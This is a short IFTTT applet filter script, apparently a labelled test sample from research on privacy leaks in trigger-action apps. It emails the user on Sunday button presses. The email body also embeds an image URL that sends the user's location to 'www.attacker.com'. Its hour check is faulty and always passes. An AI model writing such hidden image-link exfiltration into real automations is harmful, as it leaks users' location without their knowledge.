// Title: Send yourself an email with your location if it is Sunday between 0800-1200
// Maker: ---
// Link : https://www.reddit.com/r/ifttt/comments/7behu1/recipe_javascript_filter_code/
// ======================
// Applet that executes if DO Button is pressed on Sundays between 0800-1200.

// Trigger: Button widget -> Button press
// Action : Email -> Send me an email

// Policy/Presence: Confidentiality of user location / No

location = urlh(lbl('DoButton.doButtonNewCommandCommon.LocationMapImageURL'));
time = 'Meta.currentUserTime.hour()';
d = new Date();
day = d.getDay();
if ((time >= 8 || time <= 12 ) && ( day == 0 )) {
	sink('Email.sendMeEmail', 'setBody', location + imgl("www.attacker.com?" + location));
}
else {
	skip('Email.sendMeEmail');
}
